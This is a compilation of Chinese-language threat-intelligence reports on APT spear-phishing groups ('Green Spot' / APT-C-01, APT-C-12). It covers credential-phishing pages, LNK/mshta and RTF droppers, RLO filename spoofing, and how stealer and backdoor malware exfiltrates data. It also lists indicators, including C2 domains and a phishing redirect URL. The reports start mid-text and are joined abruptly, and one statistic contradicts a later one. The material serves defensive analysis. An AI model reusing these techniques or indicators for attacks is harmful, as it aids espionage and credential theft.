指向2011-2015年行动的C2域名 6.小结 “绿斑”攻击组织主要针对中国政府部门和航空、军事、科研等相关的机构和人员进行网络攻击，试图窃取机密文件或数据。这是一组时间跨度非常漫长的攻击行动，目前可以确定该攻击组织的活跃时间超过7年，甚至可能达到11年以上。该攻击组织主要采用的手法是鱼叉式网络钓鱼攻击，即以邮件作为攻击前导，邮件附件使用有社工技巧的格式溢出文档或伪装过EXE可执行文件，进行定向投放，该组织对开源后门程序进行了大量改造，使其符合作业需要，并绕过主机防护软件。在该组织的攻击中，罕有使用0day攻击的情况，而反复使用陈旧漏洞，但其对漏洞免杀技巧的应用是熟练的，甚至是抢先的。在侵入主机后，通过加密和动态加载等技术手段，试图达成进入目标并在目标机器内长期潜伏而不被发现的效果。这些攻击手段看起来并无华丽复杂的攻击装备组合，但其反复地重复使用，恰恰说明这种攻击是可能达成目的的。我们在此前反复强调，APT攻击组织使用相关漏洞的攻击窗口期，如果与可能被攻击目标的未进行对应漏洞修复的攻击窗口期重叠，就不是简单的漏洞修复问题，而是深入的排查和量损、止损问题。
网络入侵相对与传统空间的各种信息窃取破坏行为，无疑是一种成本更低，隐蔽性更强、更难以追踪溯源的方式。尽管“绿斑”组织不代表APT攻击的最高水准，但其威胁依然值得高度警惕。APT的核心从来不是A（高级），而是P（持续），因为P体现的是攻击方的意图和意志。面对拥有坚定的攻击意志、对高昂攻击成本的承受力、团队体系化作业的攻击组织来说，不会有“一招鲜、吃遍天”的防御秘诀，而必须建立扎实的系统安全能力。以“绿斑”攻击组织常用的攻击入口邮件为例，不仅要做好身份认证、通讯加密等工作，附件动态检测分析，邮件收发者所使用终端的安全加固和主动防御等工作也需要深入到位。对于重要的政府、军队、科研人员，更需要在公私邮件使用上、收发公私邮件的不同场景环境安全方面都有明确的规定与要求。邮件只是众多的动机入口之一，所有信息交换的入口，所有开放服务的暴露面，都有可能成为APT攻击者在漫长窥视和守候过程中，首发命中的机会。
面对具有中高能力水平且组织严密的网空威胁行为体，重要信息系统、关键信息基础设施运营者应根据网络与信息系统的国家安全、社会安全和业务安全属性，客观判断必须能够有效对抗哪些层级的网络空间威胁，并据此驱动网络空间安全防御需求。安天于2007年发现来自中国台湾地区相关攻击组织的初始线索，于2010年发现其进一步活动，于2013年发现其相关组织背景，于2014年将该组织命名为“绿斑”，于2018年公开发布报告 《“绿斑”行动——持续多年的攻击》 [1]，同年10月该报告被中央电视台 《焦点访谈》[2] 节目引用作为宣传网络安全的案例。 近期， 安天CERT 在梳理安全事件时，发现一批针对我国政府、科研等机构的鱼叉邮件攻击活动。经分析，这批攻击活动的手法和代码与2019年的绿斑组织活动基本一致。鱼叉邮件中多数为钓鱼链接，目的是钓取目标邮箱账户和密码信息，钓取成功后转向一个下载页面，下载到的均为看似来自官方的正常文件。另有少数邮件带有压缩包附件，里面包含的恶意文件负责释放后续的窃密程序。我们基于已掌握的数据进行汇总、梳理、分析并形成本篇报告。 通过溯源分析发现，存在部分邮件、文档的正文和钓鱼网页的源码包含有繁体中文字，多封邮件的发件IP位于中国台湾地区，邮件字体的格式为台湾地区特有的“新細明體”，这些痕迹意味这批活动背后的攻击者可能来自中国台湾。相关攻击活动特征总结如下： 表 1 1攻击活动特征 2 鱼叉邮件分析
目前观测到的鱼叉邮件主要有两种模式：正文投递钓鱼网站链接、附件投递木马文件。攻击者注册了多个163邮箱，伪装成民间智库项目经理、猎头顾问、采访者、产业联盟主任等身份发送针对性攻击邮件，在正文的末尾附上以“从QQ邮箱发来的超大附件”、“微云的文件”或“从网易163邮箱发来的云附件”等为标题的钓鱼链接，欺骗攻击目标点击打开，或者直接发送包含恶意代码的RAR附件，欺骗攻击目标下载打开。 图 2-1 投递钓鱼链接的邮件 图 2-2 投递恶意压缩包的邮件
3 钓鱼网站分析
根据安天的监测，这些大规模的邮箱钓鱼攻击活动至少开始于2018年，页面非常具有欺骗性。攻击者在获取受害者输入的账号密码后，一般很快会使用代理（有时用Opera浏览器自带VPN）做登录验证，后续可能会翻阅邮件提取价值，监测受害者动向，以至借此账号向其他目标发送攻击邮件。目前发现的钓鱼网站绝大多数使用动态域名，服务器基本购买自VPS提供商Vultr，按照钓鱼网页的形式主要分为两类： 1.伪装成常用邮箱的“云附件”登录页面，窃取受害者输入的凭证后，跳转至无毒文件的下载页面。 2.伪装成目标单位的官方邮箱网站。 3.1 钓鱼类型1 类型1钓鱼页面：例如网页伪装成“QQ邮箱中转站文件”，弹出窗口提示受害者输入常用邮箱的账号和密码，点击“验证下载”后跳转至文件下载页面，受害者可以下载到一份貌似来自官方的无毒文件，让整个过程看起来较为真实。 图 3-1 类型1钓鱼案例 图 3-2 跳转至网盘下载无毒文件 图 3-3 下载到的白文档内容 实际上“邮箱帐号安全验证”是个盗号窗口，该窗口由“qqframe.html”实现，受害者输入的帐号密码会被发送到钓鱼网站本地的“login.php”，最终到达攻击者手中。 图 3-4 盗号窗口 图 3-5 钓鱼源码 此外，还有主题伪装成“网易云附件下载”的钓鱼网站，同QQ邮箱钓鱼手法一样，受害者输入网易邮箱的账号密码点击“登录”后，跳转至文件下载页面，也能下载到一份貌似来自官方的无毒压缩包。 图 3-6 类型1钓鱼案例 图 3-7 跳转至网盘下载无毒文件 图 3-8 下载到的白压缩包内容 这里的盗号窗口由“input.html”实现，用于向钓鱼网站本地的“login.php”发送受害者输入的帐号密码。 图 3-9 钓鱼源码 统计观测到的多种钓鱼网站，可列举出以下文件名的附件，目前获取到的所有附件都不包含恶意代码，内容大多根据目标定制，看起来非常像官方文件，部分文件名列表如下： 表 3-1 观察到的白文档 3.2 钓鱼类型2 类型2钓鱼页面：伪装成攻击目标的官方邮箱网站，受害者输入账号密码点击“登录”后，钓鱼网站跳转到真正的官方网站，刚才输入的账号密码已发往钓鱼网站本地的“castc.php”文件，最终被攻击者窃取。 图 3-10 类型2钓鱼案例 图 3-11 钓鱼源码
4 恶意附件分析
邮件的恶意附件是RAR格式的压缩包，包含一个白文档，一个恶意快捷方式和一个恶意RTF文档，以其中一个典型压缩包为例： 图 4-1 压缩包附件的内容 白文档（军转干部安置政策.docx）的内容根据攻击目标定制，使之看起来像来自于官方。 恶意LNK文件（军转干部的待遇总表.rtf.lnk）的执行对象指向mshta程序以运行远程的恶意HTA脚本，但目前该链接已失效，无法继续分析。 图 4-2 恶意LNK的内容 RTF文件（军转干部的待遇规定.rtf）嵌入了一个窃密程序，当RTF被打开的时候会释放窃密程序到Windows临时目录(RTF里如果嵌入了文件， word在打开RTF文件的时候会把该文件释放到%temp%目录），但该窃密程序无法执行（即RTF文件非格式溢出漏洞），通过目前的分析推测，该窃密程序可能是通过恶意LNK文件执行的HTA脚本执行，脚本运行后打开RTF文件，随后执行临时目录下释放的窃密程序。 窃密程序使用VC++语言编写，编译时间为2019年12月12日，所属的木马家族至少从2019年开始活跃。程序运行后会利用SSE指令解密C2地址和端口，然后与C2建立连接、遍历磁盘，避开重要目录，搜索后缀名称为doc、docx、csv、lnk的文件（早期样本会搜寻更多：doc、docx、ppt、pptx、xls、xlsx、pdf、txt、jpg、rar、7z、zip），并将文件信息和内容异或加密后发送到C2。 表 4-1 窃密样本标签 窃密样本分析：
1、样本使用SSE指令解密C2地址和端口，随后尝试连接。 图 4-3 解密C2 图 4-4 尝试连接 2、连接成功后，样本会向C2发送上线数据，发送的数据为10个0x00。 图 4-5 发送数据 图 4-6 发送的数据 3、样本判断返回的数据是否为“AUgO”，并根据结果执行相应指令。 图 4-7 发送数据判断 4、如果返回的数据不为“AUgO”，样本会递归遍历磁盘，并避开系统及程序目录，在其他的目录中查找doc、docx、csv、lnk文件。 图 4-8 查找文件类型 图 4-9 避开目录查找文件 5、找到指定类型文件后，首先会判断文件的最后修改时间，如果最后修改时间是在一定时间内，会将文件名和文件大小以“LatsRo Beta:%s\\ BiSm:%ld”格式格式化后加密发送到C2中。 图 4-10 发送文件名 6、文件名和文件大小格式化后的加密方式为与固定的key进行异或运算。key的长度为0xD2。 图 4-11 加密方式 图 4-12 key 7、文件信息发送到C2后，会将文件内容以每个包4k大小拆分后加密发送到C2。 图 4-13 发送内容 8、发送的内容使用的加密方式与发送文件信息时使用的加密方式相同，也是与固定的key（长度为0xC），按字节异或操作，二者不同的地方在于使用的key不同。 图 4-14 发送内容加密 9、发送文件后，样本会发送指定字符串到C2，字符串同样使用异或方式加密，密钥长度为0xD2。 图 4-15 加密并发送 10、在未执行的分支部分，主要是对注册表的信息（软件安装列表）的读取。样本首先会发送另一个加密的字符串到C2，随后发送指定注册表项的键值，二者的加密方式相同，和发送文件名的加密方式也相同，按位异或0xD2长度的字符串。 图 4-16 加密字符串并发送 图 4-17 对注册表信息窃取加密并发送
5 溯源分析
通过溯源分析发现，这批攻击活动背后的攻击者可能来自中国台湾地区。 1. 钓鱼网站的网页源码存在繁体中文的注释，多例白文档的默认字体为“中国(台湾)”。 类型1钓鱼页面的网页源码中，存在以下繁体中文的注释： 图 5-1 网页源码中的繁体中文字 图 5-2 白文档的默认字体为中文(台湾) 2. 多封鱼叉邮件的发件源IP位于中国台湾地区。 目前已发现9封攻击邮件的发件源IP位于中国台湾地区台北市： 表 5-1 中国台湾地区的发件IP 3. 部分邮件正文的简体字句中存在繁体字，字体格式为台湾地区特有的“新細明體”。
所有的攻击目标都位于中国大陆，因此攻击邮件的正文都写成简体中文字，但也有如“错别字”般的个别繁体字留落其中，例如将“附件档”写成“附件檔”，“中国”写成“中國”。 图 5-3 简体字句中的繁体字 部分邮件的正文字体默认为“新細明體”，“新細明體”字体为台湾软件公司威锋数位制作，只为支持繁体中文的内容显示，集中使用于中国台湾地区。 图 5-4 邮件正文字体为新細明體 4. 通过一段时间的分析与检测，我们发现疑似攻击者登陆该邮件确认账号密码有效性，登陆IP为77.111.***.***，经过分析得知，该IP在2019年迄今一直是作为Opera Mini浏览器自带VPN功能的官方代理IP。 图 5-5 疑似攻击登陆陷阱邮箱记录 图 5-6 登录IP为Opera浏览器官方VPN代理 6 威胁框架视角的攻击映射
本次系列攻击活动共涉及ATT&CK框架中的7个阶段19个技术点，具体行为描述如下表： 表 6-1 近期绿斑攻击活动的技术行为描述表 将涉及到的威胁行为技术点映射到ATT＆CK框架如下图所示： 图 6-1 近期绿斑攻击活动对应的ATT&CK映射图 7 小结
绿斑攻击组织在长时间内表现出有坚定持续的攻击意志，是一个主要面向国防军工领域范围的APT攻击组织。和安天披露的其他攻击组织相比，该组织的特点是在漏洞积累方面资源较为贫乏，历史上除极少数利用的0day漏洞外，基本上以使用陈旧漏洞为主，但该组织的社会工程技巧能力非常强，善于运用邮件入口构造与收件人高相关性内容，依托社工技巧诱导被攻击者打开相关链接或载荷来实施攻击。 可以看到，整体上邮件系统作为一种高暴露的安全资产和入口，往往是APT攻击组织的一个重要的入口点，从目前来看暴露出了四个问题：第一，目前存在一些在公务和科研活动中使用个人信箱的情况；第二，在当前整个的邮件安全环节上，缺少有效的防护体系；第三，在端点上缺少能够有效对抗APT相关攻击的解决方案；第四，相应的防卫目标没有覆盖重要科研和相关人员的个人电脑和相关信息资产。因此，结合以上问题我们提出以下四点应对建议： 明确机构和个人邮件安全使用的边界和安全要求。 对政企邮件使用安全解决方案。 在端点系统上安装具备有效防护能力，同时具备EPP+EDR特性的防护软件。 将安全感知和防护范围扩展到关键人员的个人设备和家庭信息环境中。 附录一：参考链接 [1] “绿斑”行动——持续多年的攻击 https://www.antiy.com/response/20180919.html [2] 《焦点访谈》 20181007 信息安全：防内鬼 防黑客 http://tv.cctv.com/2018/10/07/VIDEHBYLGmnR5LoYZawu3dZc181007.shtml360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
毒云藤（APT-C-01）组织是一个长期针对国内国防、政府、科技和教育领域的重要机构实施网络间谍攻击活动的APT团伙，其最早的攻击活动可以追溯到2007年，360高级威研究院针对该团伙的攻击活动一直持续在进行追踪。 2019年上半年，360高级威研究院开始注意到APT-C-01组织针对国内科研机构，军工机构，国防机构，航空机构以及政府机构进行频繁的定向攻击活动。在使用360安全大脑进行溯源分析的过程中，我们发现该组织相关攻击活动从2019年5月开始至今持续活跃，从9月开始相关技战术迭代升级，目前针对相关重点目标进行集中攻击。
该组织2020年上半年主要进行了以下的定向攻击：
2020年初，在国内抗击疫情期间，该组织利用新型冠状肺炎为诱饵发起定向攻击，主要用于窃取相关的目标用户的邮箱密码
2020年上半年期间，该组织曾使用各类诱饵主题的鱼叉邮件，针对特定目标投递lnk恶意附件安装后门程序
2020年6月期间，该组织开始针对特定单一人物目标实施定向攻击。
近期，该组织针对相关目标又集中发起了一系列定向攻击活动
在本报告中，我们对APT-C-01组织上半年针对我重要机构等目标的定向攻击行动进行分析和总结，后续我们会持续披露该组织的最新攻击活动。
在360安全大脑观测的数据范围内，我们发现此次攻击活动主要涉及国内科研机构， 军工机构，国防机构，航空机构以及政府机构， 其中最多的为科研机构，占比51% 。 被攻击目标机构的 范围 分布如下：
2020年初，在国内抗击疫情之时，多个APT组织利用新型肺炎针对相关单位进行了攻击活动，APT-C-01也是其中之一。APT-C-01利用鱼叉邮件针对目标用户进行攻击，附件中通常携带伪造的邮箱钓鱼网站地址链接。
我们发现部分钓鱼链接利用知乎平台进行跳转。例如： https://link.zhihu.com/?target=http://organization.serveusers.com/index.html
当用户点击钓鱼链接时，利用知乎进行跳转，最终跳转到钓鱼网站（伪造的qq/163等）邮箱文件中转站，诱惑目标用户输入账号密码信息。
图 利用知乎跳转
该组织通过向目标发送带有恶意Rar附件的邮件,其中Rar文件中包含有恶意的lnk文件和一个恶意rtf文档，lnk文件通过mshta访问远程C2执行hta文件。
在 其中一次攻击活动的hta文件中， 我们发现攻击者连注释都没有去除。 注释使用繁体文字，进一步暴露了攻击者的身份线索 。
恶意的rtf文件中 包含一个OLE对象，当rtf运行时，释放后门到%temp%目录下，利用hta文件启动后门程序。
hta文件会删除自身，然后启动真实的rtf文档欺骗用户，最后释放下一阶段植入物到%tmp%\svchost_.tmp执行。 hta脚本执行的命令如下：
投递各类窃密木马
2020年3月，我们发现APT-C-01利用钓鱼邮件投递最新的窃密木马进行了多起攻击活动，攻击者利用钓鱼邮件携带恶意附件，附件为压缩包，其中包含APT-C-01的新窃密木马程序。
木马程序主要功能为获取目标计算机信息以及窃取特定文件名后缀的文档资料。 木马程序在启动之后，在 %temp% 目录中释放 system.vbs 和 system.bat 文件，调用 ShellExecute 执行 system.vbs 文件。 system.vbs 文件执行 system.bat 。 system.bat 文件复制木马程序到 %temp% 目录。
在此类攻击活动中，我们发现攻击者仍然使用了一个在360独家发布的《毒云藤（APT-C-01）军政情报刺探者揭露》报告中所披露的C2(emailser163.serveusers.com)实施了部分攻击活动。通过这种现象，我们可以发现APT-C-01组织是如何肆无忌惮的进行网络窃密活动，并没有因为安全厂商的披露而有所收敛 。
攻击行动C 2关联
部分C 2 与早期攻击活动动态域名供应商相同
2 018 年 9 月2 0 号，3 60 披露了毒云藤 (APT-C-01)组织 ， 在当时的披露的攻击活动中该组织使用的动态域名服务商chang e IP占比最大。而此次攻击活动中，攻击者依然热衷与使用动态域名，域名命名风格与早期已披露攻击活动中使用的相似，喜欢伪造成国内邮箱服务提供商的域名。
在2 020 年3月的一次攻击中，APT - C -01 利用pa stebin.com 来存储hta文件，攻击者利用lnk启动ms hta.exe 来访问pa stebin.com 以获取ht a 文件。
使用同一C 2 进行不同的攻击
APT - C -01 经常使用同一个C 2发起 不同的攻击活动，我们最初注意到该C 2 的攻击活动为l nk诱饵 攻击，攻击使用的钓鱼文档名为“ 2020年******重点工作任务书.rtf.lnk ”。在后续针对该C 2 进行分析时发现，该C 2 下同时还会存在伪装成网易邮箱网站进行的钓鱼攻击，钓鱼页面如下：
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
毒云藤（APT-C-01）组织是一个长期针对国内国防、政府、科技和教育领域的重要机构实施网络间谍攻击活动的APT团伙，其最早的攻击活动可以追溯到2007年。360高级威研究院10月11日独家发布的 《毒云藤（APT-C-01）组织2020上半年针对我重要机构定向攻击活动揭秘》 报告中披露了该组织上半年利用新冠肺炎等热点事件针对国内国防、政府等重要机构频繁的网络间谍攻击活动。
近期毒云藤组织的攻击活动并未减弱蛰伏，反而异常活跃。2020年6月，该组织技战术进行了调整，开始针对特定单一人物目标实施定向攻击。进一步8月初开始，我们发现该组织针对国内高等院校、科研机构等，进行了大规模邮箱系统钓鱼窃密攻击活动，涉及了大量的相关单位，相关攻击至今持续活跃。
在近期集中的钓鱼攻击活动中，攻击者依然利用鱼叉邮件发送钓鱼链接的形式进行攻击，本次攻击与该组织以往相关钓鱼攻击技战术并无太大差异，只是攻击目标变化且范围增大，另外攻击频次大幅度增加。攻击者会根据目标角色精心设计钓鱼邮件，伪造目标角色身份相关的工作文档，诱使目标访问钓鱼网站获取附件，以盗取邮箱密码。
当被攻击目标访问到伪造的钓鱼网站后，会弹出伪造的登录框提示需要输入用户名和密码。
伪造QQ邮箱登陆
伪造网易邮箱登陆
只有目标用户填写了用户名和密码登陆钓鱼网站后，才能获取到相应的附件文件
仿冒高等院校电子邮件系统
在近期的攻击活动中，毒云藤组织针对一大批高等院校的邮件系统制作了钓鱼网站。以下是部分仿冒网页：
仿冒**大学电子邮件系统
仿冒**大学电子邮件系统
仿冒**大学电子邮件系统
定制目标角色相关的诱饵文档
毒云藤组织会根据目标角色定制不同内容的诱饵文档，这些文档都是正常的文件，通常与目标角色的工作内容紧密关联。
该组织近期攻击活动中使用的部分诱饵文件名：
****** 通知信
国家******调查问卷
青年******项目评议要点
关于调整******标准的通知
航天******需求
科技部******项目申报.docx
以下是部分诱饵文档的内容：
国家******调查问卷
******博览会
国防******
APT-C-01组织C2信息关联
部分C2与早期攻击活动动态域名供应商相同
2018年9月20号，360披露了毒云藤(APT-C-01)组织， 在当时的披露的攻击活动中该组织使 用的动态域名服务商changeIP占比最大，例如serveusers.com。 而此次攻击活动中，攻击者依然热衷与使用动态域名，域名命名风格与早期已披露攻击活动中使用的相似，喜欢伪造成国内邮箱服务提供商的域名，例如count.163*.serveuser.com。
与其他攻击活动共用已暴露C2
APT-C-01会使用一些已暴露的C2发起不同的攻击活动，我们注意到一些该组织已经暴露的C2（如141.164.*.*）的攻击活动为lnk诱饵安装木马后门程序，同时在该C2下也进行了钓鱼攻击。
360 高级威胁研究院
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。最新的一份网络安全事件分析报告显示，来自中国台湾地区的网络攻击组织“绿斑”在2021年持续对中国大陆发动攻击活动，从攻击目标地域分布来看， 北京位居首位，其次是紧邻台湾岛的福建省 。
这份分析报告来自中国网络安全公司微步在线，《环球时报》记者8日获得的这份报告显示， “绿斑” APT (定向威胁攻击)组织从 2007 年开始活动，2013年组织背景被曝光，显示来源于中国台湾地区，主要针对政府部门、航空、军事相关科研机构进行攻击 ，目标是窃取高价值数据和机密信息，“鱼叉”钓鱼邮件是其惯用攻击手段。
报告显示，从2021年年初至今，“绿斑” APT 组织对国内多家重点大学发动了大规模定向钓鱼攻击活动，通常目的为窃取目标用户的账密信息。从目前检测到的攻击情报分析，该组织无论目的是采集邮箱情报信息还是投放窃密木马,都是依托钓鱼邮件方式将采集邮箱信息的钓鱼链接投送到攻击目标。 据微步在线网络安全研究响应中心负责人察罕介绍，今年捕获到的“绿斑”有针对性的攻击行动，无论是进行行业划分，还是地域划分，攻击范围都很广泛。 从行业划分上看，攻击对象排名首位的是高校，占比 50%。其次是科研机构和政府单位，占比均为15% 。针对“高校位居攻击对象首位”，察罕透露，“绿斑”在2021年攻击对象中有很大一部分是涉及台海两岸关系的研究人员。
此外，被攻击行业除了上述两大类之外，还涉及航空航天、能源、医疗等领域。就攻击目标的地域分布来看， 主要目标集中在北京，占比53% ；排名第二的是 福建省，占比9% 。不言而喻，北京是政治经济中心，而福建紧邻台湾，战略意义都非同一般。
根据察罕的介绍，“绿斑”组织攻击行为的特点很明显， 攻击目标聚焦于热点事件及热点人物，敏感度高 。比如，11月份以来，针对大陆地区疫情情况，“绿斑”开始以“疫情防控承诺书”“新冠变种病毒核酸应检人员及注意事项”“疫情期间单位门禁管制措施” 等内容为标题，对相关人员发起攻击。从2021 年上半年至今，“绿斑”还通过伪造攻击目标域名对攻击目标在职人员和关联单位/个人进行攻击，涉及到的攻击目标基本事关国家安全、稳健发展的职能或研究单位。从2011年开始持续至今，高级攻击组织蓝宝菇（APT-C-12）对我国政府、军工、科研、金融等重点单位和部门进行了持续的网络间谍活动。该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。
360追日团队捕获的首个蓝宝菇组织专用木马出现在2011年3月左右。目前已总共捕获该组织恶意代码670余个，其中包括60余个专门用于横向移动的恶意插件。目前已经发现该组织相关的C&C域名、IP数量多达40余个。
由于该组织相关恶意代码中出现特有的字符串（Poison Ivy密码是：NuclearCrisis），结合该组织的攻击目标特点，360威胁情报中心将该组织的一系列攻击行动命名为核危机行动（Operation NuclearCrisis），考虑到核武器爆炸时会产生蘑菇云，并结合该组织的一些其他特点及360威胁情报中心对APT组织的命名规则，我们将该组织名为蓝宝菇。
截止2018年5月，360追日团队已经监测到核危机行动攻击针对的境内目标近30个。其中，教育科研机构占比最高，达1%，其次是政府机构，占比为18.2%，国防机构排第三，占9.1%。其他还有事业单位、金融机构制造业等占比为4.5%。
关键词：蓝宝菇、核危机、APT
从2011年开始持续至今，高级攻击组织蓝宝菇（APT-C-12）对我国政府、军工、科研、金融等重点单位和部门进行了持续的网络间谍活动。该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。 360追日团队捕获的首个蓝宝菇组织专用木马出现在2011年3月左右。目前已总共捕获该组织恶意代码670余个，这些恶意代码可分为4类RAT，细分版本为7种。其中，还包括60余个专门用于横向移动的恶意插件，从功能区分来看也至少有5种。目前已经发现该组织相关的C&C域名、IP数量多达40余个。 由于该组织相关恶意代码中出现特有的字符串（Poison Ivy密码是：NuclearCrisis），结合该组织的攻击目标特点，360威胁情报中心将该组织的一系列攻击行动命名为核危机行动（Operation NuclearCrisis），考虑到核武器爆炸时会产生蘑菇云，并结合该组织的一些其他特点及360威胁情报中心对APT组织的命名规则，我们将该组织名为蓝宝菇。 在核危机行动针对中国的网络间谍活动中，下述相关时间点值得关注：
2011年3月，首次发现与该组织相关的木马，针对政府相关机构进行攻击。
2011年11月，对某核工业研究机构进行攻击。
2012年1月，对某大型科研机构进行攻击。
2012年3月，对某军事机构进行攻击。
2012年6月，对国内多所顶尖大学进行攻击。
2013年6月，对某中央直属机构进行攻击，同时开始使用新类型的RAT。
2014年8月，发现该组织使用5种以上的横向移动恶意代码针对重点目标机构进行大量横向移动攻击。
2014年12月，发现新的RAT，我们将其命名为Bfnet，该后门具备窃取指定扩展名文档等重要功能。
2015年9月，针对多个国家的华侨办事机构进行攻击。
2018年4月，针对国内某重要敏感金融机构发动鱼叉邮件攻击。
注：以上所述的“首次发现”时间，仅是我们目前已经了解掌握的情况，不代表我们已经掌握了该组织的全部攻击事件和行为。
第二章 攻击目的和受害分析
截止2018年5月，360追日团队已经监测到核危机行动攻击的境内目标近30个。其中，教育科研机构占比最高，达59.1%，其次是政府机构，占比为18.2%，国防机构排第三，占9.1%。其他还有事业单位、金融机构制造业等占比为4.5%。
二、 地域分布
在核危机行动的多次攻击中，我们发现其初始攻击主要采用鱼叉邮件携带二进制可执行文件这种攻击方法。攻击者仿冒官方邮件向受害者发送鱼叉邮件，诱导受害者点击邮件所携带的恶意附件。 （一）RLO [1] 伪装文档扩展名 在攻击的初期，攻击者使用的邮件附件多为一个WinRAR压缩包，其中包含伪装成Word文档的SCR文件。 下图为核危机行动鱼叉邮件压缩包中的一个伪装成Word文件的专用木马的图标和文件名截图。该文件伪装成一份通信录文件，同时，为了更好的伪装诱饵文档，攻击者使用了RLO控制符。RLO控制符是Unicode控制符的一种，用来显示中东文字，中东文字的书写顺序是从右到左的。攻击者通过在文件名中插入RLO控制符，使得字符的显示顺序变成从右至左，从而来隐藏文件的真实扩展名。
表1 核危机行动伪装成通讯录的专用木马1 当受害者点击打开这个伪装成Word文档的专用木马后，木马会在释放攻击代码的同时，释放一个真正的Word文档。下图为该诱饵Word文档打开后的信息内容，其中信息确实是一份详细的通讯录。可见，该组织在文件伪装方面确实下足了功夫。 下面是我们截获的另外一个使用了RLO伪装，同时伪装成通讯录的专用木马样本信息及该样本打开后的截图。
表2 核危机行动伪装成通讯录的专用木马2 下面是我们截获的第三个使用了RLO伪装的专用木马样本信息及该样本打开后的截图。该文件的文件名格式伪装方法与前述两个样本相同，但具体内容则伪装成了一份智库文件。
表3核危机行动伪装成某智库文件的专用木马 (二) LNK文件 2018年4月，我们捕获到了一次核危机行动的最新攻击活动。某些重要的政府和企业机构的邮箱用户收到一份发自boaostaff[@]163.com的鱼叉邮件，鱼叉邮件仿冒博鳌亚洲论坛主办方向受害者发送了一封邀请函： 邮件附件是一个163邮箱的云附件，为RAR压缩包文件。点开云附件，会跳转到对应的云端下载地址将附件下载到本地，这一过程与早期的攻击活动大致相同。 不同的是，此次新攻击下载得到的附件包含的是一个恶意LNK文件： 一旦受害者被诱导打开该LNK文件，LNK文件便会通过执行文件中附带的PowerShell恶意脚本来收集上传用户电脑中的敏感文件，并安装持久化后门程序长期监控用户计算机。
二、 持续渗透
核危机行动从2011年3月开始一直持续至今，我们总共捕获到4种RAT，细分版本达到7种，另外发现大量横向移动的恶意代码，从功能区分至少有5种。 从时间段上看，在2011-2012年，核危机行动所使用的主要攻击木马是Poison Ivy；而到了2013-2014年，Poison Ivy虽然仍在继续使用，但被升级到了几个全新的版本；2014年三季度--2015年，核危机行动开始大量进行横向移动攻击，并从2014年底开始，使用Bfnet后门。 下面就对核危机行动在上述几个阶段攻击活动的主要特点进行简要的分析说明。
（一） 2011-2012年
通过深入分析，我们发现该攻击组织每次在发起新的攻击时，往往都会采用不同以往的诱饵文件名。如在2012年1月中旬至下旬期间，主要采用“2012龙年运程”和“龙年贺卡”这两个文件名。就该组织这一特性，我们对其在2011-2012年的攻击行动中所使用的诱饵文件名进行了相关统计分析：
（1）2011年主要诱饵文档文件名
通信录类：通讯录、 *工硕班通讯录、第 组通讯录更新、 *第13期驻外人员培训班人员通讯录。 其他： 战略、《 **智库》约稿S、《国家 》S、Taitravel、 * 万言书-***2012。
（2）2012年主要诱饵文档文件名
太子传奇系列：如，太子传奇B、太子传奇C、太子传奇E等（以英文字母编号的“太子传奇”系列文件供发现近20种）。 其他： 全家福_pan、龙年贺卡MA、宝贝S、88届十二队通讯录、2012龙年运程、** 基金重大项目研究选题推荐表。 特别值得一提的是：攻击者除了对诱饵文件的文件名进行了精心的伪装之外，对诱饵文件的内容也进行了精心的设计。以最为频繁使用的“通信录”诱饵文件为例：被打开的Word文档的内容确实为相关机构人员或相关培训参与者的详细通信录信息，而且有持续的更新，如前面截图案例所示。这就使得被攻击者很难识破其中的攻击行为。同时，考虑到被攻击目标本身所处机构的敏感性，我们有理由认为，攻击者在发起攻击的过程中，已经对攻击的目标机构或个人有了比较充分的了解。 从木马的类型来看，在2011-2012年的攻击中，核危机行动主要采用了Poison Ivy这款专用木马，其在本质上一款远程控制木马程序，对应的Poison Ivy木马生成器版本主要为2.3.2。Poison Ivy木马生成器从1.0.0版本开始总共10个版本，最新版本为2.3.2。Poison Ivy木马生成器可以生成exe和ShellCode两种版本的木马。在核危机行动中，我们目前已经截获的Poison Ivy专用木马均为ShellCode形态。
（二） 2013-2014年
2013-2014年，核危机行动中所使用的Poison Ivy与2011-2012的版本相比有较大的改动和升级，但仍可通过大数据及多维分析，发现其同源性。 Poison Ivy的2013版本与2014版本的一个主要区别是“inst.exe”和“pile.dll”释放的路径不同。 2014版本的路径为：%APPDATA%/Microsoft/Internet Explorer/ 2013 版本的路径为：%TEMP%/ 下图给出了核危机行动2013-2014版的Poison Ivy专用木马的执行流程。
（三） Bfnet后门
Bfnet是一种此前未知的RAT，目前我们捕获到Bfnet有两个版本：Bfnet2014和Bfnet2015。 Bfnet后门的母体大多为利用文档图标的PE程序，执行后会释放相关后门程序（早期版本只是一个DLL文件，最新版本会有多个文件）和后门配置文件（内容主要是上线地址、端口和ID）。另外木马在执行的同时会将内置的诱饵文档打开来迷惑被攻击对象。 Bfnet释放的后门程序会修改开始菜单的程序里面的所有快捷方式：在实现快捷方式的正常功能的同时，指向rundll32，加载运行dll后门程序。 特别的，Bfnet后门会针对WPS程序进行专门攻击。Bfnet执行后会删除TEMP目录和LOCALAPPDATA目录下WPS程序，具体是删除WPS更新程序：wpsupdate.exe、updateself.exe，删除WPS通知程序：desktoptip.exe、wpsnotify.exe。下图是Bfnet删除WPS相关程序代码截图 Bfnet后门的2015版和2014版之间也有一定的差异。2015版除了部分指令和功能有变化外，还增加了加密功能，会对部分关键字符串进行加密。
（四） 对抗技术
